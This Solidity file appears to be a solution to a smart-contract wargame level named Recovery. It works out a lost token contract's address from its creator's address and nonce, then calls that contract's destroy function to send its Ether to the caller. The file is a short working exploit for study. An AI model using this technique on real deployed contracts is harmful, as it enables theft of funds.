// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Recovery.sol";

contract RecoveryAttack {
    function att(address payable addr) public {
        address a = address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), addr, uint8(0x01))))));
        SimpleToken(payable(a)).destroy(payable (msg.sender));
    }
}